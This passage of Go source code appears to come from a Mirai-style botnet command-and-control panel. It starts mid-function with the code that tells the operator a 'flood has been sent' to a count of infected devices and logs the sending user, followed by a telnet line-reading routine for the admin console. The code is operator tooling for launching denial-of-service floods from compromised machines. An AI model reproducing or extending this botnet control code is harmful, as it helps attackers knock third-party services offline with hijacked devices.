                        } else {
                            AttackCount = clientList.Count()
                        }
                        this.conn.Write([]byte(fmt.Sprintf("\033[38;5;46mFlood has been sent to \033[37m%d\033[38;5;46m devices.\r\n", AttackCount)))
                        fmt.Println("\033[93mCommand sent by \033[1;91m[" + username + "]\033[1;92m using command line\033[0m\n")
                } else {
                    //this.conn.Write([]byte(fmt.Sprintf("\033[0;94mThis \033[0;97mIP \033[0;94mhas \033[0;97mbeen \033[0;94mblack \033[0;97mlisted \033[0;94mby \033[0;97m"+ username +"!\r\n")))
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 9999999)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
